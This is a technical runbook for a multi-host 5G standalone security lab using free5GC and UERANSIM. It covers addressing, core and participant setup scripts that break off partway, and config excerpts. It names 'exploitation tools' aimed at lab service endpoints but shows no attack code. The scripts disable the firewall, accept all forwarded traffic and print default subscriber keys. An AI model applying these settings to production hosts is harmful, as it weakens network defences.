# **Comprehensive Technical Architecture & Runbook: 5G SA Multi-Host Exploitation Lab**

**Author / Maintainer:** https://github.com/vijaykumargowdakk

**Software Versions:** free5GC v4.2.3 | UERANSIM v3.3.0 | Linux Ubuntu 22.04 LTS

**Target Architecture:** 3GPP Release 15/16 5G Standalone (SA) Multi-Host Deployment

**Repositories:**

* Core Network: https://github.com/vijaykumargowdakk/Telecom-security-5gc-core-lab.git  
* Participant Simulator: https://github.com/vijaykumargowdakk/Telecom-security-5g-ue-users.git

## **1\. Executive Summary & Lab Evolution**

This environment is an end-to-end 3GPP 5G Standalone (SA) security assessment laboratory. The architecture isolates the 5G Core Network Functions (free5GC) on a dedicated host while external participant workstations (laptops) simulate the 5G Radio Access Network (gNodeB) and User Equipment (UE) using UERANSIM.

\+-----------------------------------------------------------------------------------+  
|                        5G CORE SERVER (reinfosec@reinfosec)                       |  
|                                                                                   |  
|  Physical Interface: enp6s0 (192.168.1.47)  |  SBA Dummy: sbi\_net (10.0.0.1/24)  |  
|                                                                                   |  
|   \+-------------------+   \+--------------------+   \+---------------------------+  |  
|   |  AMF (Control)    |   |  SMF (Session)     |   |  UPF (Data Plane)         |  |  
|   |  N2: :38412 SCTP  |   |  PFCP: 10.0.0.2:8805|  |  PFCP: 10.0.0.1:8805      |  |  
|   |  SBI: 10.0.0.18   |   |  SBI: 10.0.0.2     |   |  N3: 192.168.1.47:2152 UDP|  |  
|   \+---------+---------+   \+---------+----------+   \+-------------+-------------+  |  
|             |                       |                            |                |  
\+-------------|-----------------------|----------------------------|----------------+  
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;| (N2 / NGAP)           | (Static Route 10.0.0.0/24) | (N3 / GTP-U)  
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;|                       |                            |  
\+-------------|-----------------------|----------------------------|----------------+  
|             |                       |                            |                |  
|   \+---------+---------+             |              \+-------------+-------------+  |  
|   | gNodeB (nr-gnb)   |             |              | UE SIM (nr-ue)            |  |  
|   | N2: 192.168.1.73  |             |              | Interface: uesimtun0      |  |  
|   | N3: 192.168.1.73  |             |              | IP: 10.60.0.1 (Data)      |  |  
|   \+-------------------+             |              \+---------------------------+  |  
|                                     v                                             |  
|                     SBA REST API Exploitation Tools                               |  
|                     Targeting http://10.0.0.18:8000 (AMF)                         |  
|                     Targeting http://10.0.0.2:8000  (SMF)                         |  
|                     Targeting http://10.0.0.10:8000 (NRF)                         |  
|                                                                                   |  
|                      PARTICIPANT LAPTOP (ue01@ue01)                               |  
|                      Physical Interface: wlp3s0 (192.168.1.73)                    |  
\+-----------------------------------------------------------------------------------+

### **Architectural Shift: Single-Host Namespaces vs. Multi-Host Hardware**

1. **Single-Host Flaw (Previous State):**  
   In early tests, running free5GC and UERANSIM on the same machine caused a kernel routing loop: packets exiting uesimtun0 looped indefinitely back through lo or enp6s0, requiring network namespace isolation (useNamespace: true).  
2. **Multi-Host Workshop Architecture (Current State):**  
   For external students/analysts to connect their own machines, network namespaces are disabled (useNamespace: false). The participant laptop's host kernel directly manages the virtual TUN interface (uesimtun0), while radio frames and GTP-U traffic travel across the physical switch/Wi-Fi or Tailscale network.

## **2\. IP Addressing Architecture & Subnet Allocations**

The lab uses distinct, non-overlapping IPv4 spaces:

| Network Subnet | Name / Role | Scope | Description |
| :---- | :---- | :---- | :---- |
| 192.168.1.0/24 | **Physical Transport** | LAN Broadcast | Physical communication between Core Server (.47) and Participant Laptops (.73, etc.). |
| 10.0.0.0/24 | **Service-Based Architecture (SBA)** | Server Dummy Net | Internal HTTP/2 microservices for Core NFs (NRF, AMF, SMF, UDR, UDM, PCF). |
| 10.60.0.0/16 | **5G User Plane Data Network (DNN)** | 5G GTP Tunnel | IP range assigned to mobile subscribers (uesimtun0). Defaults to 10.60.0.1 for UE 1\. |
| 100.64.0.0/10 | **Tailscale WireGuard Mesh** | VPN Overlay | Alternative transport for remote participants (100.70.246.5 Core, 100.97.93.1 UE). |

### **Internal SBA IP Allocations (10.0.0.0/24)**

* **Dummy Gateway:** 10.0.0.1 (Interface: sbi\_net on the server)  
* **UPF N4 (PFCP):** 10.0.0.1:8805 (UDP)  
* **SMF N4 (PFCP):** 10.0.0.2:8805 (UDP)  
* **SMF SBI:** 10.0.0.2:8000 (HTTP)  
* **UDM SBI:** 10.0.0.3:8000 (HTTP)  
* **UDR SBI:** 10.0.0.4:8000 (HTTP)  
* **NEF SBI:** 10.0.0.5:8000 (HTTP)  
* **PCF SBI:** 10.0.0.7:8000 (HTTP)  
* **AUSF SBI:** 10.0.0.9:8000 (HTTP)  
* **NRF SBI:** 10.0.0.10:8000 (HTTP)  
* **AMF SBI:** 10.0.0.18:8000 (HTTP)  
* **NSSF SBI:** 10.0.0.31:8000 (HTTP)  
* **CHF SBI:** 10.0.0.113:8000 (HTTP)

## **3\. Server-Side Configuration & Automation (Telecom-security-5gc-core-lab)**

### **3.1 Kernel & Routing Prerequisites**

To function as a 3GPP router and packet gateway, the server kernel requires specific flags configured at boot:

* net.ipv4.ip\_forward \= 1: Enables Linux packet routing between interfaces.  
* net.ipv4.conf.all.rp\_filter \= 0: Disables Reverse Path Filtering to allow asymmetric routing.  
* net.ipv4.conf.all.route\_localnet \= 1: Allows traffic destined for local addresses to be routed across external interfaces.  
* gtp5g.ko: A custom Linux kernel driver that implements the User Plane Function (UPF) fast-path packet decapsulation in kernel space rather than userspace.

### **3.2 Dynamic Setup Script (setup\_and\_start\_core.sh)**

This script handles interface auto-detection, kernel state preparation, dummy interface allocation for the SBA, dynamic configuration patching via an inline Python routine, database cleanup, process supervision, and automated listener verification.

\#\!/usr/bin/env bash  
set \-e

echo "=================================================="  
echo "    5G CORE NETWORK (free5GC) DYNAMIC SETUP       "  
echo "=================================================="

if \[ "$EUID" \-ne 0 \]; then  
&nbsp;&nbsp;&nbsp;&nbsp;echo "\[-\] Please run this script with sudo: sudo ./setup\_and\_start\_core.sh \[interface\]"  
&nbsp;&nbsp;&nbsp;&nbsp;exit 1  
fi

REAL\_USER="${SUDO\_USER:-$USER}"  
USER\_HOME=$(getent passwd "$REAL\_USER" | cut \-d: \-f6)  
SCRIPT\_DIR="$(cd "$(dirname "${BASH\_SOURCE\[0\]}")" && pwd)"

\# 1\. Interface Detection  
AVAILABLE\_INTERFACES=($(ip \-o link show | awk \-F': ' '{print $2}' | grep \-v "lo\\|dummy\\|upf\\|sbi\\|docker\\|tun"))

if \[ \-n "$1" \]; then  
&nbsp;&nbsp;&nbsp;&nbsp;PHYSICAL\_IF="$1"  
else  
&nbsp;&nbsp;&nbsp;&nbsp;echo "\[\*\] Detected network interfaces: ${AVAILABLE\_INTERFACES\[\*\]}"  
&nbsp;&nbsp;&nbsp;&nbsp;DEFAULT\_IF=$(ip route show default 2\>/dev/null | awk '{print $5}' | head \-n1)  
&nbsp;&nbsp;&nbsp;&nbsp;read \-p "\[?\] Enter physical interface to use \[Default: $DEFAULT\_IF\]: " INPUT\_IF  
&nbsp;&nbsp;&nbsp;&nbsp;PHYSICAL\_IF="${INPUT\_IF:-$DEFAULT\_IF}"  
fi

if \[ \-z "$PHYSICAL\_IF" \] || \! ip link show "$PHYSICAL\_IF" \>/dev/null 2\>&1; then  
&nbsp;&nbsp;&nbsp;&nbsp;echo "\[-\] Error: Interface '$PHYSICAL\_IF' is invalid."  
&nbsp;&nbsp;&nbsp;&nbsp;exit 1  
fi

SERVER\_IP=$(ip \-4 addr show dev "$PHYSICAL\_IF" | grep \-m1 inet | awk '{print $2}' | cut \-d'/' \-f1)  
if \[ \-z "$SERVER\_IP" \]; then  
&nbsp;&nbsp;&nbsp;&nbsp;echo "\[-\] Error: No IPv4 address found on $PHYSICAL\_IF."  
&nbsp;&nbsp;&nbsp;&nbsp;exit 1  
fi

echo "\[+\] Using Interface: $PHYSICAL\_IF"  
echo "\[+\] Detected Core IP: $SERVER\_IP"

\# 2\. Kernel Routing & Forwarding  
echo "\[+\] Configuring Kernel IP forwarding and routing..."  
sysctl \-w net.ipv4.ip\_forward=1 \>/dev/null  
sysctl \-w net.ipv4.conf.all.rp\_filter=0 \>/dev/null  
sysctl \-w net.ipv4.conf.default.rp\_filter=0 \>/dev/null  
sysctl \-w "net.ipv4.conf.$PHYSICAL\_IF.rp\_filter=0" \>/dev/null 2\>&1 || true  
sysctl \-w net.ipv4.conf.lo.rp\_filter=0 \>/dev/null  
sysctl \-w net.ipv4.conf.all.route\_localnet=1 \>/dev/null  
systemctl stop ufw \>/dev/null 2\>&1 || true

\# 3\. Dummy Interface for Service-Based Architecture (SBA: 10.0.0.0/24)  
echo "\[+\] Configuring sbi\_net dummy interface (10.0.0.1/24)..."  
ip link add dev sbi\_net type dummy 2\>/dev/null || true  
ip addr add 10.0.0.1/24 dev sbi\_net 2\>/dev/null || true  
ip link set sbi\_net up 2\>/dev/null || true  
ip route replace local 10.0.0.0/24 dev sbi\_net

\# 4\. NAT Forwarding  
iptables \-F FORWARD  
iptables \-A FORWARD \-j ACCEPT  
iptables \-t nat \-C POSTROUTING \-o "$PHYSICAL\_IF" \-j MASQUERADE 2\>/dev/null || \\  
&nbsp;&nbsp;&nbsp;&nbsp;iptables \-t nat \-A POSTROUTING \-o "$PHYSICAL\_IF" \-j MASQUERADE

\# 5\. Modules & MongoDB  
echo "\[+\] Checking gtp5g module..."  
if \! lsmod | grep \-q "gtp5g"; then  
&nbsp;&nbsp;&nbsp;&nbsp;modprobe udp\_tunnel 2\>/dev/null || true  
&nbsp;&nbsp;&nbsp;&nbsp;modprobe gtp5g 2\>/dev/null || true  
&nbsp;&nbsp;&nbsp;&nbsp;if \! lsmod | grep \-q "gtp5g"; then  
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;echo "\[-\] Error: gtp5g module is not loaded."  
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;exit 1  
&nbsp;&nbsp;&nbsp;&nbsp;fi  
fi

echo "\[+\] Starting MongoDB service..."  
systemctl start mongod  
mongosh free5gc \--eval "db.NfProfile.deleteMany({})" 2\>/dev/null || mongo free5gc \--eval "db.NfProfile.deleteMany({})" 2\>/dev/null || true

\# 6\. Dynamic Configuration Patching via Python (Avoids YAML Escaping/Indentation Bugs)  
echo "\[+\] Updating core configuration files with IP: $SERVER\_IP..."  
python3 \- \<\< PYEOF  
import re

\# Update amfcfg.yaml ngapIpList  
with open("$SCRIPT\_DIR/config/amfcfg.yaml", "r") as f:  
&nbsp;&nbsp;&nbsp;&nbsp;lines \= f.readlines()

out \= \[\]  
in\_ngap \= False  
for line in lines:  
&nbsp;&nbsp;&nbsp;&nbsp;if "ngapIpList:" in line:  
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;out.append("  ngapIpList:\\n")  
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;out.append("    \- $SERVER\_IP\\n")  
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;in\_ngap \= True  
&nbsp;&nbsp;&nbsp;&nbsp;elif in\_ngap and line.strip().startswith("-"):  
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;continue  \# Clear stale dynamic list entries  
&nbsp;&nbsp;&nbsp;&nbsp;else:  
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;in\_ngap \= False  
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;out.append(line)

with open("$SCRIPT\_DIR/config/amfcfg.yaml", "w") as f:  
&nbsp;&nbsp;&nbsp;&nbsp;f.writelines(out)

\# Update upfcfg.yaml N3 GTP-U IP  
with open("$SCRIPT\_DIR/config/upfcfg.yaml", "r") as f:  
&nbsp;&nbsp;&nbsp;&nbsp;upf \= f.read()  
upf \= re.sub(r'(- type: N3\\s+addr:\\s\*)\[0-9\\.\]+', r'\\g\<1\>$SERVER\_IP', upf)  
with open("$SCRIPT\_DIR/config/upfcfg.yaml", "w") as f:  
&nbsp;&nbsp;&nbsp;&nbsp;f.write(upf)

\# Ensure smfcfg.yaml PFCP bindings stay aligned  
with open("$SCRIPT\_DIR/config/smfcfg.yaml", "r") as f:  
&nbsp;&nbsp;&nbsp;&nbsp;smf \= f.read()  
smf \= re.sub(r'nodeID: 10\\.0\\.0\\.\[0-9\]+(\\s\*\# the Node ID of this SMF)', r'nodeID: 10.0.0.2\\1', smf)  
smf \= re.sub(r'listenAddr: 10\\.0\\.0\\.\[0-9\]+(\\s\*\# the IP/FQDN of N4 interface on this SMF)', r'listenAddr: 10.0.0.2\\1', smf)  
smf \= re.sub(r'externalAddr: 10\\.0\\.0\\.\[0-9\]+(\\s\*\# the IP/FQDN of N4 interface on this SMF)', r'externalAddr: 10.0.0.2\\1', smf)  
smf \= re.sub(r'(UPF:.\*?\\n\\s+type: UPF.\*?\\n\\s+nodeID:\\s\*)10\\.0\\.0\\.\[0-9\]+', r'\\g\<1\>10.0.0.1', smf, flags=re.DOTALL)  
smf \= re.sub(r'(UPF:.\*?\\n\\s+type: UPF.\*?\\n\\s+nodeID:.\*?\\n\\s+addr:\\s\*)10\\.0\\.0\\.\[0-9\]+', r'\\g\<1\>10.0.0.1', smf, flags=re.DOTALL)  
with open("$SCRIPT\_DIR/config/smfcfg.yaml", "w") as f:  
&nbsp;&nbsp;&nbsp;&nbsp;f.write(smf)  
PYEOF

\# 7\. Cleanup & Daemon Launch  
echo "\[+\] Cleaning up previous instances..."  
killall \-q \-9 amf smf nrf udr udm pcf ausf nssf chf nef bsf upf webconsole 2\>/dev/null || true  
pkill \-9 \-f "free5gc/bin" 2\>/dev/null || true  
ip link delete upfgtp 2\>/dev/null || true  
sleep 2

echo "\[+\] Starting free5GC Core Network..."  
cd "$SCRIPT\_DIR"  
nohup ./run.sh \> free5gc\_startup.log 2\>&1 &  
FREE5GC\_PID=$\!  
echo "\[+\] free5GC started (PID: $FREE5GC\_PID). Log: free5gc\_startup.log"

\# Wait for AMF to bind to SCTP port 38412  
echo "\[\*\] Waiting for AMF to bind to $SERVER\_IP:38412..."  
COUNT=0  
while \! ss \-l \-n \-a \--sctp | grep \-q "$SERVER\_IP:38412"; do  
&nbsp;&nbsp;&nbsp;&nbsp;sleep 1  
&nbsp;&nbsp;&nbsp;&nbsp;COUNT=$((COUNT \+ 1))  
&nbsp;&nbsp;&nbsp;&nbsp;if \[ "$COUNT" \-ge 20 \]; then  
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;echo "\[-\] Timeout: AMF did not bind to $SERVER\_IP:38412. Error details from log:"  
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;grep \-aiE "amf|fatal|panic|error" free5gc\_startup.log | tail \-n 15  
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;exit 1  
&nbsp;&nbsp;&nbsp;&nbsp;fi  
done  
echo "\[SUCCESS\] AMF is listening on $SERVER\_IP:38412."

\# Start Webconsole  
if \[ \-f "$SCRIPT\_DIR/webconsole/bin/webconsole" \]; then  
&nbsp;&nbsp;&nbsp;&nbsp;cd "$SCRIPT\_DIR/webconsole"  
&nbsp;&nbsp;&nbsp;&nbsp;nohup ./bin/webconsole \> "$SCRIPT\_DIR/webconsole.log" 2\>&1 &  
&nbsp;&nbsp;&nbsp;&nbsp;echo "\[+\] Webconsole running on http://127.0.0.1:5000"  
fi

echo "=================================================="  
echo " \[SUCCESS\] 5G CORE IS ACTIVE AND READY"  
echo " Tell participants to connect to Core IP: $SERVER\_IP"  
echo "=================================================="

### **3.3 Core Server Teardown Script (teardown\_core.sh)**

To cleanly return the core server host to its default state without rebooting:

\#\!/usr/bin/env bash  
if \[ "$EUID" \-ne 0 \]; then  
&nbsp;&nbsp;&nbsp;&nbsp;echo "\[-\] Please run with sudo: sudo ./teardown\_core.sh"  
&nbsp;&nbsp;&nbsp;&nbsp;exit 1  
fi

echo "\[+\] Stopping free5GC network functions..."  
killall \-9 \-q amf smf nrf udr udm pcf ausf nssf chf nef bsf upf webconsole 2\>/dev/null || true  
pkill \-9 \-f "free5gc/bin" 2\>/dev/null || true

echo "\[+\] Removing tunnel and SBI dummy devices..."  
ip link delete upfgtp 2\>/dev/null || true  
ip link delete sbi\_net 2\>/dev/null || true

echo "\[+\] Flushing NAT rules..."  
iptables \-F FORWARD  
iptables \-t nat \-F POSTROUTING

echo "\[+\] Resetting database NF cache..."  
mongosh free5gc \--eval "db.NfProfile.deleteMany({})" 2\>/dev/null || mongo free5gc \--eval "db.NfProfile.deleteMany({})" 2\>/dev/null || true

echo "\[SUCCESS\] Core network cleanly terminated."

### **3.4 Key Core Configuration Files**

#### **config/amfcfg.yaml (Excerpts)**

configuration:  
&nbsp;&nbsp;amfName: AMF  
&nbsp;&nbsp;ngapIpList:  
&nbsp;&nbsp;&nbsp;&nbsp;\- 192.168.1.47  \# Dynamically set by setup\_and\_start\_core.sh  
&nbsp;&nbsp;ngapPort: 38412  
&nbsp;&nbsp;sbi:  
&nbsp;&nbsp;&nbsp;&nbsp;scheme: http  
&nbsp;&nbsp;&nbsp;&nbsp;registerIPv4: 10.0.0.18  
&nbsp;&nbsp;&nbsp;&nbsp;bindingIPv4: 10.0.0.18  
&nbsp;&nbsp;&nbsp;&nbsp;port: 8000  
&nbsp;&nbsp;serviceNameList:  
&nbsp;&nbsp;&nbsp;&nbsp;\- namf-comm  
&nbsp;&nbsp;&nbsp;&nbsp;\- namf-evts  
&nbsp;&nbsp;&nbsp;&nbsp;\- namf-mt  
&nbsp;&nbsp;&nbsp;&nbsp;\- namf-loc  
&nbsp;&nbsp;&nbsp;&nbsp;\- namf-oam  
&nbsp;&nbsp;&nbsp;&nbsp;\- namf-callback  
&nbsp;&nbsp;servedGuamiList:  
&nbsp;&nbsp;&nbsp;&nbsp;\- plmnId:  
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;mcc: 208  
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;mnc: 93  
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;amfId: cafe00  
&nbsp;&nbsp;supportTaiList:  
&nbsp;&nbsp;&nbsp;&nbsp;\- plmnId:  
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;mcc: 208  
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;mnc: 93  
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;tac: 000001  
&nbsp;&nbsp;plmnSupportList:  
&nbsp;&nbsp;&nbsp;&nbsp;\- plmnId:  
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;mcc: 208  
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;mnc: 93  
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;snssaiList:  
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;\- sst: 1  
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;sd: 010203  
&nbsp;&nbsp;security:  
&nbsp;&nbsp;&nbsp;&nbsp;integrityOrder:  
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;\- NIA2  
&nbsp;&nbsp;&nbsp;&nbsp;cipheringOrder:  
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;\- NEA0  
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;\- NEA2

#### **config/upfcfg.yaml (Excerpts)**

configuration:  
&nbsp;&nbsp;upfName: UPF  
&nbsp;&nbsp;pfcp:  
&nbsp;&nbsp;&nbsp;&nbsp;nodeID: 10.0.0.1  
&nbsp;&nbsp;&nbsp;&nbsp;listenAddr: 10.0.0.1  
&nbsp;&nbsp;gtpu:  
&nbsp;&nbsp;&nbsp;&nbsp;forwarder: open5gs  
&nbsp;&nbsp;&nbsp;&nbsp;ifList:  
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;\- addr: 192.168.1.47  \# Dynamically matches Core physical IP for N3 GTP-U  
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;type: N3  
&nbsp;&nbsp;dnnList:  
&nbsp;&nbsp;&nbsp;&nbsp;\- cidr: 10.60.0.0/16  
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;dnn: internet  
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;natifname: enp6s0

#### **config/smfcfg.yaml (Excerpts)**

configuration:  
&nbsp;&nbsp;smfName: SMF  
&nbsp;&nbsp;sbi:  
&nbsp;&nbsp;&nbsp;&nbsp;scheme: http  
&nbsp;&nbsp;&nbsp;&nbsp;registerIPv4: 10.0.0.2  
&nbsp;&nbsp;&nbsp;&nbsp;bindingIPv4: 10.0.0.2  
&nbsp;&nbsp;&nbsp;&nbsp;port: 8000  
&nbsp;&nbsp;pfcp:  
&nbsp;&nbsp;&nbsp;&nbsp;nodeID: 10.0.0.2  
&nbsp;&nbsp;&nbsp;&nbsp;listenAddr: 10.0.0.2  
&nbsp;&nbsp;&nbsp;&nbsp;externalAddr: 10.0.0.2  
&nbsp;&nbsp;userplaneInformation:  
&nbsp;&nbsp;&nbsp;&nbsp;upNodes:  
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;UPF:  
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;type: UPF  
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;nodeID: 10.0.0.1  
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;addr: 10.0.0.1  
&nbsp;&nbsp;&nbsp;&nbsp;links:  
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;\- gNB:  
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;tac: 1  
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;UPF:  
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;nodeID: 10.0.0.1

## **4\. Participant Laptop Architecture (Telecom-security-5g-ue-users)**

Participant laptops emulate both the 5G New Radio Base Station (nr-gnb) and the Subscriber Equipment (nr-ue).

### **4.1 Multi-Participant Scaling Architecture**

To support workshops where multiple participants connect simultaneously:

1. **Subscriber Identities (IMSI/SUPI):** Each attendee selects a Participant Number ![][image1], yielding an IMSI of imsi-20893000000000N. This eliminates session teardown collisions in the AMF.  
2. **NR Cell Identity (NCI):** Each participant generates an isolated simulated cell (0x0000000N0), preventing base station collision errors on the AMF's NGAP SCTP handler.  
3. **Point-to-Point vs. Broadcast Route Handling:** Point-to-point TUN devices (tailscale0) use device-based routes (dev tailscale0), whereas Ethernet/Wi-Fi devices (wlp3s0) use gateway routes (via \<CORE\_IP\>).  
4. **MTU Clamping for Overlays:** When connecting across Tailscale, uesimtun0's MTU is clamped to 1200 bytes to prevent WireGuard fragmentation and dropped HTTP traffic.

### **4.2 Dynamic Participant Setup Script (setup\_and\_start\_ue.sh)**

\#\!/usr/bin/env bash  
set \-e

echo "=================================================="  
echo "    5G MULTI-PARTICIPANT UE / gNodeB DYNAMIC SETUP"  
echo "=================================================="

if \[ "$EUID" \-ne 0 \]; then  
&nbsp;&nbsp;&nbsp;&nbsp;echo "\[-\] Please run this script with sudo: sudo ./setup\_and\_start\_ue.sh"  
&nbsp;&nbsp;&nbsp;&nbsp;exit 1  
fi

SCRIPT\_DIR="$(cd "$(dirname "${BASH\_SOURCE\[0\]}")" && pwd)"

\# 1\. Prerequisites Installation  
if \! command \-v cmake \>/dev/null 2\>&1 || \! command \-v jq \>/dev/null 2\>&1; then  
&nbsp;&nbsp;&nbsp;&nbsp;echo "\[+\] Installing compilation dependencies and tools..."  
&nbsp;&nbsp;&nbsp;&nbsp;apt-get update \-qq && apt-get install \-y \-qq make gcc g++ libsctp-dev lksctp-tools iproute2 cmake git jq curl  
fi

\# 2\. Build UERANSIM if not already compiled  
if \[ \! \-f "$SCRIPT\_DIR/build/nr-gnb" \] || \[ \! \-f "$SCRIPT\_DIR/build/nr-ue" \]; then  
&nbsp;&nbsp;&nbsp;&nbsp;echo "\[+\] Compiling UERANSIM binaries..."  
&nbsp;&nbsp;&nbsp;&nbsp;cd "$SCRIPT\_DIR"  
&nbsp;&nbsp;&nbsp;&nbsp;make \-j$(nproc)  
fi

\# 3\. Prompt for Participant Number & Enforce Unique Identity  
echo ""  
echo "--------------------------------------------------"  
read \-p "\[?\] Enter Participant Number (1, 2, 3, etc.) \[Default: 1\]: " PARTICIPANT\_NUM  
PARTICIPANT\_NUM="${PARTICIPANT\_NUM:-1}"

SUPI="imsi-208930000000001"  
if \[ "$PARTICIPANT\_NUM" \-gt 1 \]; then  
&nbsp;&nbsp;&nbsp;&nbsp;SUPI=$(printf "imsi-20893%010d" "$PARTICIPANT\_NUM")  
fi

IMEI\_BASE="35693803564380"  
IMEI="${IMEI\_BASE}${PARTICIPANT\_NUM}"  
NCI=$(printf "0x%09x0" "$PARTICIPANT\_NUM")

echo "\[+\] Assigned SUPI/IMSI: $SUPI"  
echo "\[+\] Assigned gNodeB NCI: $NCI"  
echo "\[+\] Assigned IMEI:       $IMEI"  
echo "--------------------------------------------------"

\# 4\. Webconsole Warning for Additional Subscribers  
if \[ "$PARTICIPANT\_NUM" \-gt 1 \]; then  
&nbsp;&nbsp;&nbsp;&nbsp;echo ""  
&nbsp;&nbsp;&nbsp;&nbsp;echo "\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*"  
&nbsp;&nbsp;&nbsp;&nbsp;echo " \[\!\] ATTENTION: SUBSCRIBER MUST BE PROVISIONED ON 5G CORE"  
&nbsp;&nbsp;&nbsp;&nbsp;echo " Before starting the UE, verify this subscriber exists in the"  
&nbsp;&nbsp;&nbsp;&nbsp;echo " free5GC Webconsole (http://\<CORE\_IP\>:5000):"  
&nbsp;&nbsp;&nbsp;&nbsp;echo "   \- PLMN ID:             208 / 93"  
&nbsp;&nbsp;&nbsp;&nbsp;echo "   \- IMSI:                ${SUPI\#imsi-}"  
&nbsp;&nbsp;&nbsp;&nbsp;echo "   \- Key:                 8baf473f2f8fd09487cccbd7097c6862"  
&nbsp;&nbsp;&nbsp;&nbsp;echo "   \- OP / OPC:            OP"  
&nbsp;&nbsp;&nbsp;&nbsp;echo "   \- OP Value:            8e27b6af0e692e750f32667a3b14605d"  
&nbsp;&nbsp;&nbsp;&nbsp;echo "   \- S-NSSAI (Slice):     SST: 1, SD: 010203"  
&nbsp;&nbsp;&nbsp;&nbsp;echo "   \- Data Network (DNN):  internet"  
&nbsp;&nbsp;&nbsp;&nbsp;echo "\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*"  
&nbsp;&nbsp;&nbsp;&nbsp;read \-p "\[?\] Press \[Enter\] once subscriber is provisioned in Webconsole to continue..."  
fi

\# 5\. Interface Detection  
AVAILABLE\_INTERFACES=($(ip \-o link show | awk \-F': ' '{print $2}' | grep \-v "lo\\|dummy\\|docker\\|tun"))  
DEFAULT\_IF=$(ip route show default 2\>/dev/null | awk '{print $5}' | head \-n1)  
echo ""  
echo "\[\*\] Detected network interfaces: ${AVAILABLE\_INTERFACES\[\*\]}"  
read \-p "\[?\] Enter participant physical/overlay interface \[Default: $DEFAULT\_IF\]: " INPUT\_IF  
PARTICIPANT\_IF="${INPUT\_IF:-$DEFAULT\_IF}"

PARTICIPANT\_IP=$(ip \-4 addr show dev "$PARTICIPANT\_IF" | grep \-m1 inet | awk '{print $2}' | cut \-d'/' \-f1)  
if \[ \-z "$PARTICIPANT\_IP" \]; then  
&nbsp;&nbsp;&nbsp;&nbsp;echo "\[-\] Error: No IPv4 address found on $PARTICIPANT\_IF."  
&nbsp;&nbsp;&nbsp;&nbsp;exit 1  
fi  
echo "\[+\] Detected Participant Local IP: $PARTICIPANT\_IP"

\# 6\. Prompt for Core Server IP  
read \-p "\[?\] Enter the free5GC Core Server IP: " CORE\_SERVER\_IP  
if \[ \-z "$CORE\_SERVER\_IP" \]; then  
&nbsp;&nbsp;&nbsp;&nbsp;echo "\[-\] Core Server IP cannot be empty."  
&nbsp;&nbsp;&nbsp;&nbsp;exit 1  
fi

\# 7\. Static Route Injection to SBA (10.0.0.0/24)  
if \[ "$PARTICIPANT\_IF" \= "tailscale0" \]; then  
&nbsp;&nbsp;&nbsp;&nbsp;echo "\[+\] Point-to-Point device detected (tailscale0). Adding device route..."  
&nbsp;&nbsp;&nbsp;&nbsp;ip route replace 10.0.0.0/24 dev tailscale0  
else  
